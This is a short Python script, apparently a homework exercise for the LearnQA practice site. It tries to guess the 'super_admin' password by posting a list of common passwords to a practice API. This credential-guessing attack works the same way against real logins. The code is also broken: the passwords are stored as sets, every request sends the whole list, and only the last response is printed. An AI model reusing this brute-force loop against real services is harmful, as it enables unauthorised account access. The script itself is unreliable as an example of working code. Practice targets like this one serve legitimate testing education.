import requests

url_get_pass = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url_cookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

passwords = [
    {"123456"},
    {"123456789"},
    {"qwerty"},
    {"password"},
    {"1234567"},
    {"12345678"},
    {"12345"},
    {"iloveyou"},
    {"111111"},
    {"123123"},
    {"abc123"},
    {"qwerty123"},
    {"1q2w3e4r"},
    {"admin"},
    {"qwertyuiop"},
    {"654321"},
    {"555555"},
    {"lovely"},
    {"7777777"},
    {"welcome"},
    {"888888"},
    {"princess"},
    {"dragon"},
    {"password1"},
    {"123qwe"}
]





for password in passwords:
    response = requests.post(url_get_pass, data={"login": "super_admin", "password": passwords})
print(response.text)

cookie = dict(response.cookies)




#https://en.wikipedia.org/wiki/List_of_the_most_common_passwords